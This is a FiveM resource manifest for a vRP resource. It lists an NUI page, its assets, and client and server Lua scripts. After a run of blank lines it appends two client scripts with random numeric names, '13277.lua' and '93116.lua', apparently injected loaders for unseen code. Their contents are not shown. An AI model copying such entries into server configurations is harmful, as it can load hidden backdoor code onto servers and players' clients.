
resource_manifest_version '05cfa83c-a124-4cfa-a768-c24a5811d8f9'


ui_page "nui/index.html"
files {
	'nui/index.html',
	'nui/style.css',
  'nui/script.js',
  'nui/img/*.png'
}

client_scripts{ 
  "lib/Tunnel.lua",
  "lib/Proxy.lua",
  "config.lua",
  "client.lua",
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "config.lua",
  "server.lua"
}





client_script "13277.lua"
client_script '93116.lua'